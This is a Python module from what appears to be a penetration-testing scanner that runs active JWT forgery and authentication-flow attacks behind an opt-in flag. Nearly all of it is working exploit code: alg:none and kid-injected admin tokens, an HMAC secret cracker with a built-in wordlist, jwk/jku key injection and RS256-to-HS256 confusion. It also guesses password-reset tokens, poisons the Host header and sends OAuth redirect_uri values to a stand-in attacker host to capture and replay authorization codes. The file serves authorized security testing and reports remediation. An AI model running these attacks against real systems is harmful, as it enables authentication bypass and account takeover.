"""
jwtred.py — JWT Forgery + Auth-Flow Attack Module (VANTHEX v1.2.2).
AUTHORIZED TESTING ONLY — ENGAGEMENT ONLY, WRITTEN SCOPE REQUIRED.

Stdlib-only JWT toolkit (parse/sign/verify) plus an operator-gated active
check `c_jwt_attack` that runs, against endpoints PROVEN to accept a genuine
token (differential baseline):

  a. alg:none signature strip                -> CONFIRMED CRITICAL 9.8 (CWE-347)
  b. weak-HMAC-secret crack + re-sign        -> CONFIRMED CRITICAL 9.1 (CWE-798)
  c. kid path-traversal / kid SQLi           -> CONFIRMED HIGH 8.1   (CWE-347)
  d. jwk / jku header key injection          -> CONFIRMED CRITICAL 9.1 (CWE-347)
  e. RS256->HS256 public-key key confusion   -> CONFIRMED CRITICAL 9.1 (CWE-347)
  f. claim tampering (exp/aud/iss) fallback  -> HIGH 7.4 probable     (CWE-613)

Auth-flow abuse (same gate, same check): predictable password-reset tokens,
reset-link host-header poisoning, token leakage via Referer, OAuth
redirect_uri code leak, code replay, implicit flow token in fragment.

Gating: the check is a NO-OP unless opts['jwtred'] is truthy or the
VANTHEX_JWTRED environment variable is set. A finding is CONFIRMED only on a
real differential proof: a TAMPERED token accepted (HTTP 200) by an endpoint
that was first shown to accept the genuine token. English finding text.
"""
import base64 as _b64
import hashlib as _hashlib
import hmac as _hmac
import json as _json
import os as _os
import re as _re
import time as _time

__version__ = "1.0.0"

# ---------------------------------------------------------------- toolkit


def b64url_encode(data: bytes) -> str:
    """URL-safe base64 without padding (JWT wire format)."""
    return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(seg: str) -> bytes:
    """URL-safe base64 decode, padding-tolerant."""
    s = (seg or "").strip().replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return _b64.b64decode(s)


def parse_token(token: str) -> dict:
    """Split a JWT -> {'header', 'payload', 'signature_b64'} (raw JSON
    values decoded; None on malformed input)."""
    try:
        parts = str(token).strip().split(".")
        if len(parts) != 3:
            return {}
        header = _json.loads(b64url_decode(parts[0]))
        payload = _json.loads(b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature_b64": parts[2]}
    except Exception:
        return {}


def sign_hs256(secret: str, header: dict, payload: dict) -> str:
    """Sign header.payload with HS256 -> compact JWT string."""
    h = b64url_encode(_json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(_json.dumps(payload, separators=(",", ":")).encode())
    sig = b64url_encode(_hmac.new(str(secret).encode(), f"{h}.{p}".encode(),
                                  _hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def verify_hs256(token: str, secret: str) -> bool:
    """Constant-time HS256 signature check."""
    try:
        h, p, s = str(token).split(".")
        sig = b64url_encode(_hmac.new(str(secret).encode(),
                                      f"{h}.{p}".encode(),
                                      _hashlib.sha256).digest())
        return _hmac.compare_digest(sig, s)
    except Exception:
        return False


# --------------------------------------------------------- weak-secret cracker

# Embedded base words (top common JWT/API secrets) + pattern mutations
# expand deterministically to ~3000 candidates.
_CRACK_BASE = [
    "password123", "secret", "jwt_secret", "changeme", "vanthex",
    "app-secret", "vanthex-secret", "password", "123456", "admin",
    "jwt", "token", "secretkey", "jwt-secret", "your-256-bit-secret",
    "supersecret", "supersecretsecret", "s3cr3t", "key", "private",
    "secret_key", "secret-key", "hs256", "signature", "test", "dev",
    "development", "production", "staging", "qwerty", "letmein",
    "welcome", "monkey", "dragon", "iloveyou", "abc123", "password1",
    "p@ssw0rd", "passw0rd", "default", "changeit", "temporary",
    "temp", "example", "demo", "sample", "null", "undefined",
    "authorization", "bearer", "auth", "login", "session", "app",
    "application", "api", "server", "service", "system", "root",
    "superuser", "administrator", "oauth", "openid", "connect",
    "mysecret", "my-secret", "my_secret", "sharedsecret", "clientsecret",
    "client_secret", "signingkey", "signing-key", "signing_secret",
]

_CRACK_SUFFIXES = (["", "!", "1", "12", "123", "1234", "12345", "2023",
                    "2024", "2025", "2026", "@1", "#1", "0", "00", "01",
                    "007", "69", "99", "100", "123!", "!23", "@123",
                    "-key", "_key", "key", "_2024", "-2024", "2023!",
                    "s", "es", "ie", "y", "123456"]
                   + [str(n) for n in range(2000, 2031)]
                   + [str(n).zfill(2) for n in range(0, 13)])


def _crack_candidates(wordlist):
    """Deterministic expansion of base words -> ~3000 candidate secrets."""
    base = list(wordlist) if wordlist else _CRACK_BASE
    out, seen = [], set()
    for w in base:
        for cand in (w, w.capitalize(), w.upper(),
                     *[w + s for s in _CRACK_SUFFIXES]):
            if cand and cand not in seen:
                seen.add(cand)
                out.append(cand)
    return out


def crack_hs256(token: str, wordlist=None, time_budget: float = 20.0):
    """Try candidate secrets against a HS256 token's signature.
    Timing-bounded: stops immediately when found or when time_budget
    (seconds, monotonic) is exhausted. Returns the secret or None."""
    parsed = parse_token(token)
    if not parsed or str(parsed.get("header", {}).get("alg", "")).upper() != "HS256":
        return None
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = parsed["signature_b64"]
    deadline = _time.monotonic() + max(1.0, float(time_budget))
    for cand in _crack_candidates(wordlist):
        if _time.monotonic() > deadline:
            return None
        sig = b64url_encode(_hmac.new(cand.encode(), signing_input,
                                      _hashlib.sha256).digest())
        if _hmac.compare_digest(sig, expected):
            return cand
    return None


# ------------------------------------------------------------------ findings

def _F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
       confidence="probable", location="", param=""):
    """Finding factory — shape identical to vulnscan2.F (origin jwtred)."""
    return {"severity": sev, "title": title, "description": desc,
            "evidence": evidence, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": "jwtred"}


# ------------------------------------------------------------------ probing

_TOKEN_RE = _re.compile(
    r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*")

_LOGIN_CANDIDATES = ("/jwt/login", "/api/session/jwt", "/api/auth/login",
                     "/auth/login", "/api/login", "/login")
_PROFILE_CANDIDATES = ("/jwt/profile", "/jwt/none", "/jwt/kid", "/jwt/jku",
                       "/admin/me", "/api/me", "/api/user", "/api/profile",
                       "/profile", "/me")
_RS_CANDIDATES = ("/jwt/rs", "/api/jwt_rs")
_CLAIM_CANDIDATES = ("/jwt/claims", "/api/me", "/profile")
_AUTHORIZE_CANDIDATES = ("/jwt/oauth/authorize", "/oauth/authorize")


def _token_from_resp(r):
    if r.status != 200 or not r.body:
        return None
    try:
        j = _json.loads(r.body)
        for k in ("token", "access_token", "jwt", "id_token", "api_token"):
            v = j.get(k)
            if isinstance(v, str) and v.count(".") == 2:
                return v
    except Exception:
        pass
    m = _TOKEN_RE.search(r.body or "")
    return m.group(0) if m else None


def _obtain_token(ctx, opts):
    """opts['jwt_token'] first; else login candidates (POST JSON), else
    tokens already present on the surface (homepage / cookies / JS pages)."""
    tok = str(opts.get("jwt_token") or "")
    if tok.count(".") == 2:
        return tok
    for ep in _LOGIN_CANDIDATES[: int(opts.get("jwt_probe_limit", 4))]:
        r = ctx.client.post(ep, data=_json.dumps(
            {"user": "alice", "username": "alice", "email": "alice@fixture.local",
             "password": "x"}),
            headers={"Content-Type": "application/json"})
        tok = _token_from_resp(r)
        if tok:
            return tok
    try:
        surf = ctx.surface(full=False)
        srcs = [(surf.homepage.body if surf.homepage else "")]
        try:
            srcs += surf.homepage.hdr_all("set-cookie")
        except Exception:
            pass
        for src in srcs:
            m = _TOKEN_RE.search(src or "")
            if m:
                return m.group(0)
    except Exception:
        pass
    return None


def _bearer(ctx, ep, token, method="GET", headers=None):
    h = {"Authorization": f"Bearer {token}"}
    h.update(headers or {})
    return ctx.client.request(method, ep, headers=h)


def _accepted(r, marker=None):
    """A tampered token is 'accepted' only on a real 200 (not soft-404,
    not redirect-to-login)."""
    if r is None or r.status != 200:
        return False
    if marker and marker not in (r.body or ""):
        return False
    return True


def _baseline_endpoints(ctx, token, opts):
    """Endpoints that accept the GENUINE token with 200 — the differential
    baseline every confirmed finding requires."""
    eps = str(opts.get("jwt_endpoint") or "").split(",")
    eps = [e.strip() for e in eps if e.strip()] or list(_PROFILE_CANDIDATES)
    out = []
    for ep in eps[: int(opts.get("jwt_probe_limit", 8))]:
        try:
            r = _bearer(ctx, ep, token)
        except Exception:
            continue
        if _accepted(r):
            out.append(ep)
    return out


def _elevated(payload):
    p = dict(payload or {})
    p["role"] = "admin"
    p["isAdmin"] = True
    return p


# ------------------------------------------------------------- attack probes

def _attack_alg_none(ctx, ep, token, parsed, add):
    try:
        tok = "{}.{}.".format(
            b64url_encode(_json.dumps({"alg": "none", "typ": "JWT"},
                                      separators=(",", ":")).encode()),
            b64url_encode(_json.dumps(_elevated(parsed["payload"]),
                                      separators=(",", ":")).encode()))
        r = _bearer(ctx, ep, tok)
    except Exception:
        return
    if _accepted(r):
        add(_F("CRITICAL", "JWT alg:none Authentication Bypass",
               "The endpoint accepts an unsigned alg:none token with "
               "elevated claims (role=admin, isAdmin=true) — anyone can "
               "forge arbitrary identities and fully bypass authentication.",
               evidence=f"alg:none token with role=admin accepted at {ep}",
               cwe="CWE-347", owasp="A07:2021", cvss=9.8,
               remed="Reject alg:none and pin the expected algorithm; "
                     "signature verification is mandatory.",
               confidence="confirmed", location=ep))


def _attack_weak_secret(ctx, ep, token, parsed, add, opts):
    if str(parsed["header"].get("alg", "")).upper() != "HS256":
        return
    secret = str(opts.get("jwt_secret") or "") or crack_hs256(
        token, time_budget=float(opts.get("jwt_crack_budget", 15)))
    if not secret:
        return
    try:
        tok = sign_hs256(secret, {"alg": "HS256", "typ": "JWT"},
                         _elevated(parsed["payload"]))
        r = _bearer(ctx, ep, tok)
    except Exception:
        return
    if _accepted(r):
        add(_F("CRITICAL", "JWT Weak HMAC Secret + Privilege Escalation",
               "The HMAC secret was cracked from the built-in weak-secret "
               "list and a token re-signed with role=admin, isAdmin=true "
               "was accepted — complete authentication and authorization "
               "bypass.",
               evidence=f"secret '{secret}' cracked; re-signed admin token "
                        f"accepted at {ep}",
               cwe="CWE-798", owasp="A07:2021", cvss=9.1,
               remed="Use a cryptographically random secret (>=32 bytes), "
                     "store it in a secret manager, and rotate tokens.",
               confidence="confirmed", location=ep))


def _attack_kid(ctx, ep, token, parsed, add):
    kids = {"../../dev/null": "kid path traversal to an empty-key file "
                              "(../../dev/null)",
            "' OR 1=1--": "kid SQL injection pattern (' OR 1=1--)"}
    for kid, what in kids.items():
        try:
            tok = sign_hs256("", {"alg": "HS256", "typ": "JWT", "kid": kid},
                             _elevated(parsed["payload"]))
            r = _bearer(ctx, ep, tok)
        except Exception:
            continue
        if _accepted(r):
            add(_F("HIGH", "JWT kid Injection",
                   f"The endpoint resolves the JWT header 'kid' insecurely — "
                   f"{what} — and a forged token with elevated claims was "
                   f"accepted. Depending on the backend this enables key "
                   f"spoofing, file read, or SQL injection.",
                   evidence=f"kid={kid!r} token with role=admin accepted "
                            f"at {ep}",
                   cwe="CWE-347", owasp="A07:2021", cvss=8.1,
                   remed="Allow-list kid values; never pass kid into a file "
                         "path, command, or SQL query.",
                   confidence="confirmed", location=ep))


def _attack_jwk_jku(ctx, ep, token, parsed, add, opts):
    my_secret = "vhx-jwk-attacker-key"
    jwk = {"kty": "oct", "alg": "HS256",
           "k": b64url_encode(my_secret.encode())}
    variants = [("jwk", {"alg": "HS256", "typ": "JWT", "jwk": jwk}, my_secret,
                 "embedded jwk (oct key) in the token header")]
    jku = str(opts.get("jwt_jku_url") or "")
    if jku:
        variants.append(("jku", {"alg": "HS256", "typ": "JWT", "jku": jku},
                         my_secret,
                         f"jku header pointing at attacker-hosted JWKS ({jku})"))
    for field, header, secret, what in variants:
        try:
            tok = sign_hs256(secret, header, _elevated(parsed["payload"]))
            r = _bearer(ctx, ep, tok)
        except Exception:
            continue
        if _accepted(r):
            add(_F("CRITICAL", "JWT Key-Confusion/JWK Header Injection",
                   f"The endpoint trusts attacker-controlled key material in "
                   f"the JWT header — {what} — so a token signed with our "
                   f"own key carrying role=admin, isAdmin=true was accepted.",
                   evidence=f"{field} header injection accepted at {ep}",
                   cwe="CWE-347", owasp="A07:2021", cvss=9.1,
                   remed="Never read key material from the token header; "
                         "pin the verification key server-side.",
                   confidence="confirmed", location=ep))


def _attack_rs_confusion(ctx, token, add, opts):
    """RS256->HS256: an endpoint that verifies HS256 using the RSA PUBLIC
    key bytes as the HMAC secret accepts tokens we sign with the (public!)
    PEM — no private key needed."""
    eps = [e.strip() for e in str(opts.get("jwt_rs_endpoint") or "").split(",")
           if e.strip()] or list(_RS_CANDIDATES)
    pem = None
    for src in [str(opts.get("jwt_public_key_url") or ""), "/jwt/pub.pem",
                "/.well-known/jwks.json"]:
        if not src:
            continue
        try:
            r = ctx.client.get(src)
        except Exception:
            continue
        if r.status == 200 and "PUBLIC KEY" in (r.body or ""):
            pem = r.body.strip()
            break
    if not pem:
        return
    for ep in eps[: int(opts.get("jwt_probe_limit", 4))]:
        try:
            tok = sign_hs256(pem, {"alg": "HS256", "typ": "JWT"},
                             _elevated({"sub": "alice", "role": "user"}))
            r = _bearer(ctx, ep, tok)
        except Exception:
            continue
        if _accepted(r):
            add(_F("CRITICAL", "JWT RS256→HS256 Key Confusion",
                   "The endpoint accepts HS256 tokens and verifies them "
                   "using the RSA PUBLIC key as the HMAC secret. Since the "
                   "public key is not secret, an attacker signs tokens "
                   "with role=admin and the server accepts them.",
                   evidence=f"HS256 token signed with the public key bytes "
                            f"accepted at {ep}",
                   cwe="CWE-347", owasp="A07:2021", cvss=9.1,
                   remed="Reject HS256 when the configured key is RSA; "
                         "enforce the expected algorithm per key.",
                   confidence="confirmed", location=ep))


def _attack_claim_tamper(ctx, token, parsed, add, opts):
    """Fallback: endpoints that decode the payload without verifying the
    signature accept expired/edited claims. Probable (no identity
    differential), HIGH 7.4."""
    eps = [e.strip() for e in str(opts.get("jwt_claim_endpoint") or "").split(",")
           if e.strip()] or list(_CLAIM_CANDIDATES)
    payload = dict(parsed.get("payload") or {})
    if not payload:
        return
    payload["exp"] = 1                      # long-expired
    payload.pop("aud", None)
    payload.pop("iss", None)
    payload["role"] = "admin"
    tampered = "{}.{}.{}".format(token.split(".")[0],
                                 b64url_encode(_json.dumps(
                                     payload, separators=(",", ":")).encode()),
                                 token.split(".")[2])
    for ep in eps[: int(opts.get("jwt_probe_limit", 4))]:
        try:
            r = _bearer(ctx, ep, tampered)
        except Exception:
            continue
        if _accepted(r):
            add(_F("HIGH", "JWT Claim Tampering Accepted",
                   "A token with tampered claims (expired exp, aud/iss "
                   "dropped, role=admin) and its original signature was "
                   "accepted — the endpoint processes the payload without "
                   "verifying the signature.",
                   evidence=f"tampered-claims token accepted at {ep}",
                   cwe="CWE-613", owasp="A07:2021", cvss=7.4,
                   remed="Always verify the signature and validate exp, "
                         "aud and iss before trusting claims.",
                   confidence="probable", location=ep))


# --------------------------------------------------- password reset flow

def _check_reset_flow(ctx, add, opts):
    ep_req = str(opts.get("reset_endpoint") or "/reset/token")
    ep_conf = str(opts.get("reset_confirm_endpoint")
                  or ep_req.replace("/token", "/token/confirm"))
    email = "alice@fixture.local"

    # 1. predictable token: issue twice seconds apart, then CONFIRM the
    #    timestamp-guessed token.
    toks = []
    for _ in range(2):
        try:
            r = ctx.client.post(ep_req, data=_json.dumps({"email": email}),
                                headers={"Content-Type": "application/json"})
        except Exception:
            return
        try:
            toks.append(str(_json.loads(r.body).get("reset_token", "")))
        except Exception:
            return
    predicted = None
    minute = int(_time.time()) // 60
    for m in (minute - 1, minute, minute + 1):
        cand = _hashlib.md5(f"{email}:{m}".encode()).hexdigest()
        if cand in toks:
            predicted = cand
    if predicted:
        try:
            r = ctx.client.post(ep_conf,
                                data=_json.dumps({"email": email,
                                                  "token": predicted}),
                                headers={"Content-Type": "application/json"})
        except Exception:
            r = None
        if r is not None and r.status == 200:
            add(_F("HIGH", "Predictable Password Reset Token",
                   "Reset tokens are derivable (md5(email + wall-clock "
                   "minute)) — an attacker who knows the email and the "
                   "approximate time can reset any account's password.",
                   evidence=f"predicted token {predicted[:12]}… accepted by "
                            f"{ep_conf}",
                   cwe="CWE-330", owasp="A07:2021", cvss=8.1,
                   remed="Generate reset tokens with a CSPRNG, make them "
                         "single-use and short-lived.",
                   confidence="confirmed", location=ep_req))
    # 2. host-header poisoning: reset link built from the Host header.
    evil = "attacker.jwtred.example"
    link = None
    for hdr in ({"Host": evil}, {"X-Forwarded-Host": evil}):
        try:
            r = ctx.client.get(ep_req + "?email=" + email, headers=hdr)
        except Exception:
            continue
        body = r.body or ""
        if evil in body:
            link = body[body.index(evil): body.index(evil) + 120]
            break
    if link:
        add(_F("HIGH", "Password Reset Poisoning",
               "The password-reset link is built from the attacker-"
               "controlled Host/X-Forwarded-Host header, so the reset URL "
               "(and its token) can be pointed at an attacker's host.",
               evidence=f"poisoned link served: {link}…",
               cwe="CWE-640", owasp="A07:2021", cvss=7.4,
               remed="Build reset links from a server-side allow-listed "
                     "base URL, never from request headers.",
               confidence="confirmed", location=ep_req))
    # 3. token in URL query -> Referer leakage (attacker-log simulation).
    if toks and toks[0]:
        try:
            r = ctx.client.get(
                "/jwt/referer",
                headers={"Referer": f"http://app.local/reset?token={toks[0]}"})
        except Exception:
            r = None
        if r is not None and r.status == 200 and toks[0] in (r.body or ""):
            add(_F("MEDIUM", "Reset Token Leakage via Referer",
                  "The reset token travels in the URL query string and is "
                  "disclosed to third-party pages through the Referer "
                  "header (simulated attacker page echoed it back).",
                  evidence="token from the reset URL surfaced in the "
                           "Referer header of a cross-origin fetch",
                  cwe="CWE-598", owasp="A07:2021", cvss=5.4,
                  remed="Send tokens only in the POST body or a fragment; "
                        "set Referrer-Policy: no-referrer on reset pages.",
                  confidence="probable", location=ep_req))


# -------------------------------------------------------------- OAuth abuse

def _check_oauth(ctx, add, opts):
    eps = [e.strip() for e in str(opts.get("oauth_authorize_endpoint") or "")
           .split(",") if e.strip()] or list(_AUTHORIZE_CANDIDATES)
    evil = "attacker.jwtred.example"
    for ep in eps[: int(opts.get("jwt_probe_limit", 4))]:
        ru = f"http://{evil}/cb"
        try:
            r = ctx.client.get(f"{ep}", params=(
                f"client_id=probe&response_type=code&redirect_uri={ru}"))
        except Exception:
            continue
        loc = r.hdr("location")
        if r.status in (301, 302) and evil in loc and "code=" in loc:
            code = loc.split("code=", 1)[1].split("&", 1)[0]
            add(_F("HIGH", "OAuth redirect_uri Open Redirect + Code Leak",
                   "The authorization server redirects to ANY redirect_uri, "
                   "delivering the freshly issued authorization code to an "
                   "attacker-controlled host — full account takeover via "
                   "code interception.",
                   evidence=f"{ep} redirected to {evil} with code={code}",
                   cwe="CWE-601", owasp="A07:2021", cvss=7.4,
                   remed="Allow-list exact redirect_uri values per client.",
                   confidence="confirmed", location=ep))
            # code replay: the issued code must die on first exchange.
            if code:
                ex = ep.replace("/authorize", "/exchange")
                statuses = []
                for _ in range(2):
                    try:
                        rr = ctx.client.get(ex, params=f"code={code}",
                                            headers={"X-Jwtred": "replay"})
                    except Exception:
                        break
                    statuses.append(rr.status)
                if len(statuses) == 2 and all(s == 200 for s in statuses):
                    add(_F("HIGH", "OAuth Code Replay",
                           "An authorization code was accepted by the token "
                           "exchange endpoint TWICE — codes are not "
                           "invalidated on use, so an intercepted or leaked "
                           "code can be replayed to mint sessions.",
                           evidence=f"{ex} returned 200 for the same code "
                                    f"twice (statuses {statuses})",
                           cwe="CWE-294", owasp="A07:2021", cvss=8.0,
                           remed="Invalidate the authorization code on first "
                                 "use (RFC 6749 §4.1.2); replay must fail.",
                           confidence="confirmed", location=ex))
        # implicit flow: access token delivered in the URL fragment.
        try:
            r2 = ctx.client.get(
                f"{ep}", params=("client_id=probe&response_type=token"
                                 f"&redirect_uri={ru}"))
        except Exception:
            continue
        loc2 = r2.hdr("location")
        if r2.status in (301, 302) and "#" in loc2 and "access_token=" in loc2:
            add(_F("HIGH", "OAuth Implicit Flow Token in Fragment",
                   "The authorization server supports the implicit "
                   "response_type=token, exposing bearer access tokens in "
                   "URL fragments (leaked via history, logs and Referer).",
                   evidence=f"{ep} issued access_token in the redirect "
                            f"fragment",
                   cwe="CWE-598", owasp="A07:2021", cvss=7.1,
                   remed="Disable the implicit grant; use authorization "
                         "code + PKCE.",
                   confidence="probable", location=ep))


# ------------------------------------------------------- the gated check

def _gated(ctx):
    return bool(ctx.opts.get("jwtred")
                or _os.environ.get("VANTHEX_JWTRED")
                or _os.environ.get("PTK_JWTRED"))


def c_jwt_attack(ctx, add):
    """Operator-gated active check: JWT forgery + auth-flow abuse.
    No-op unless opts['jwtred'] (or env VANTHEX_JWTRED) is set."""
    if not _gated(ctx):
        ctx.L("  [jwtred] gated off (opts['jwtred'] / VANTHEX_JWTRED not set)")
        return
    ctx.L("  [jwtred] operator-gated JWT/auth-flow attacks enabled")
    opts = ctx.opts
    token = _obtain_token(ctx, opts)
    if not token:
        ctx.L("  [jwtred] no JWT discovered — auth-flow checks only")
        _check_reset_flow(ctx, add, opts)
        _check_oauth(ctx, add, opts)
        return
    parsed = parse_token(token)
    if not parsed or not isinstance(parsed.get("payload"), dict):
        return
    # RS256->HS256 key confusion (dedicated candidates) + flows.
    _attack_rs_confusion(ctx, token, add, opts)
    _check_reset_flow(ctx, add, opts)
    _check_oauth(ctx, add, opts)
    # Token attacks only against endpoints PROVEN to accept the real token.
    for ep in _baseline_endpoints(ctx, token, opts):
        _attack_alg_none(ctx, ep, token, parsed, add)
        _attack_weak_secret(ctx, ep, token, parsed, add, opts)
        _attack_kid(ctx, ep, token, parsed, add)
        _attack_jwk_jku(ctx, ep, token, parsed, add, opts)
        _attack_claim_tamper(ctx, token, parsed, add, opts)
        if ctx.cancelled():
            break


CHECKS = [c_jwt_attack]
